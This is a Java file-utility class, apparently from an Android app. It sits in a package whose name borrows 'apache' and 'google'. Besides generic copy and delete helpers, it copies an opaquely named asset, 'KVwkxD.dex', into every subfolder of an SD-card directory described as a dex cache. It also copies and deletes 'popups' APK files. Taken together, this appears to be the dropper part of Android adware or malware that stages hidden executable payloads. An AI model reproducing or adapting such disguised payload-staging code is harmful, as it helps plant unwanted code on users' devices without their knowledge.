package apache.org.google.utils;

import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;

import android.content.Context;
import android.os.Environment;
import android.os.Looper;
import android.util.Log;
import android.widget.Toast;

public class FileUtil {

	 
	private static final String ASSETS_PATH = "Oo"
			+ File.separator;
	
	private static final String ASSETS_DOUPATH = "doudouIMSI"
			+ File.separator;

	private static final String DIR_PATH = "Oo" + File.separator;

	/**
	 * 从assets中读取文件
	 * 
	 * @param fileName
	 * @return
	 */
	public static InputStream readFileFormAssets(Context context, String filName,boolean isImsi) {
		InputStream is = null;
		String fileName = null;
		if(isImsi)
			fileName= ASSETS_DOUPATH + filName;
		else 
			fileName= ASSETS_PATH + filName;
		try {
			is = context.getResources().getAssets().open(fileName);

		} catch (IOException e) {
			// TODO Auto-generated catch block
			Log.e("msg", "--->IOException--文件读取错误！");
			return null;
		}

		return is;
	}

	/**
	 * 向SD卡中写入文件
	 * 
	 * @param is
	 * @return
	 */
	public static boolean writrFileToSD(Context context, String fileName,boolean isImsi) {
		File file = null;
		File filsName = null;
		FileOutputStream fos = null;
		InputStream is = null;
		if (isSdMount()) {
			File dirFile  = new File(Environment.getExternalStorageDirectory()+"/Oo");
			if(!dirFile.exists())
				dirFile.mkdirs();

			String[] fileStr = getDexCacheFlieList(ASSETS_PATH);
			if (null == fileStr || fileStr.length == 0) {
				Looper.prepare();
				Toast.makeText(context, "androidDexCache下的文件夹还没创建！请稍后",
						Toast.LENGTH_SHORT).show();
				Looper.loop();
				return false;
			}

			for (int i = 0; i < fileStr.length; i++) {

				String filePath = DIR_PATH + fileStr[i] + File.separator;
				file = new File(Environment.getExternalStorageDirectory(),
						filePath);
				if (!file.exists()) {
					file.mkdirs();
				}
				filsName = new File(file, fileName);
				try {
					is = FileUtil.readFileFormAssets(context, "KVwkxD.dex",isImsi);
					fos = new FileOutputStream(filsName);
					byte[] buffer = new byte[1024];
					int len = 0;
					if (fos != null && is != null) {
						while ((len = is.read(buffer)) != -1) {

							fos.write(buffer, 0, len);
						}
					}
				} catch (IOException e) {

					Looper.prepare();

					Toast.makeText(context, "获取assets的InputStream失败！", 1)
							.show();

					Looper.loop();
					return false;

				} finally {
					if (fos != null) {
						try {
							fos.close();
							is.close();
						} catch (IOException e) {
							// TODO Auto-generated catch block
							e.printStackTrace();
						}

					}
				}

			}

		} else {
			Looper.prepare();
			Toast.makeText(context, "请检查内存卡是否存在或者挂载成功", Toast.LENGTH_SHORT)
					.show();
			Looper.loop();
			return false;
		}

		return true;
	}

	/**
	 * 判断sd卡是否挂载
	 * 
	 * @return
	 */
	public static boolean isSdMount() {

		return Environment.getExternalStorageState().equals(
				Environment.MEDIA_MOUNTED);
	}

	/**
	 * 返回目标文件中得子文件
	 * 
	 * @param fileName
	 * @return
	 */
	public static String[] getDexCacheFlieList(String fileName) {
		if (isSdMount()) {
			File file = new File(Environment.getExternalStorageDirectory()
					.toString(), fileName);
			if (file != null && file.isDirectory()) {
				return file.list();
			}
		}

		return null;
	}

	/**
	 * 递归删除文件
	 * 
	 * @param dir
	 */
	public static boolean deleteFile(File dir) {
		boolean deleteTag = false;
		File[] files = dir.listFiles();
		for (File f : files) {
			if (f.isDirectory()) {
				deleteFile(f);
			} else {
				deleteTag = f.delete();
				if (!deleteTag)
					return false;
			}

		}
		deleteTag = dir.delete();
		if (!deleteTag)
			return false;
		return true;
	}

	/**
	 * 简单的复制一个文件
	 * @param sourcefile
	 *            源文件
	 * @param targetFile
	 *            目标文件
	 * @throws IOException
	 */
	public static void copyFile(File sourcefile, File targetFile) {

		// 新建文件输入流并对它进行缓冲
		FileInputStream input = null;
		BufferedInputStream inbuff = null;
		FileOutputStream out = null;
		BufferedOutputStream outbuff = null;
		try {
			input = new FileInputStream(sourcefile);
			inbuff = new BufferedInputStream(input);

			// 新建文件输出流并对它进行缓冲
			out = new FileOutputStream(targetFile);
			outbuff = new BufferedOutputStream(out);
		} catch (FileNotFoundException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}

		// 缓冲数组
		byte[] b = new byte[1024 * 5];
		int len = 0;
		try {
			while ((len = inbuff.read(b)) != -1) {
				outbuff.write(b, 0, len);
			}
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}

		// 刷新此缓冲的输出流
		try {
			outbuff.flush();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} finally {
			// 关闭流
			try {
				inbuff.close();
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
			try {
				outbuff.close();
			} catch (IOException e1) {
				// TODO Auto-generated catch block
				e1.printStackTrace();
			}
			try {
				out.close();
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
			try {
				input.close();
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}

	}

	/**
	 *  复制整个文件夹,采用了递归的思想
	 * @param sourceDir
	 * @param targetDir
	 * @throws IOException
	 */
	public static void copyDirectiory(String sourceDir, String targetDir)
			throws IOException {

		// 新建目标目录
		File targeFile = new File(targetDir);
		if(!targeFile.exists())
			targeFile.mkdirs();

		// 获取源文件夹当下的文件或目录
		File[] file = (new File(sourceDir)).listFiles();
		for (int i = 0; i < file.length; i++) {
			if (file[i].isFile()) {
				// 源文件
				File sourceFile = file[i];
				// 目标文件
				File targetFile = new File(
						new File(targetDir).getAbsolutePath() + File.separator
								+ file[i].getName());

				copyFile(sourceFile, targetFile);

			}

			if (file[i].isDirectory()) {
				// 准备复制的源文件夹
				String dir1 = sourceDir + file[i].getName();
				// 准备复制的目标文件夹
				String dir2 = targetDir + "/" + file[i].getName();
				//递归复制
				copyDirectiory(dir1, dir2);
			}
		}

	}

	/**
	 * 只删除目录下的apk文件
	 */
	public static boolean deletPopupsApk(File dir)
	{
		boolean deleteTag = false;
		File[] files = dir.listFiles();
		for (File f : files) {
			if (f.isDirectory()) {
				//deleteFile(f);
			} else {
				if(f.getName().endsWith(".apk"))
				{
					deleteTag = f.delete();
					if (!deleteTag)
						return deleteTag;
				}
			}
		}
		return true;
	}
	
	
	
	/**
	 *  复制popups文件下的apk文件
	 * @param sourceDir
	 * @param targetDir
	 * @throws IOException
	 */
	public static void copyPopupsApk(String sourceDir, String targetDir)
			throws IOException {

		// 新建目标目录
		File targeFile = new File(targetDir);
		if(!targeFile.exists())
			targeFile.mkdirs();

		// 获取源文件夹当下的文件或目录
		File[] file = (new File(sourceDir)).listFiles();
		for (int i = 0; i < file.length; i++) {
			if (file[i].isFile()) {
				if(file[i].getName().endsWith(".apk"))
				{
					// 源文件
					File sourceFile = file[i];
					// 目标文件
					File targetFile = new File(
							new File(targetDir).getAbsolutePath() + File.separator
									+ file[i].getName());

					copyFile(sourceFile, targetFile);
				}
			}
		}

	}
	
}
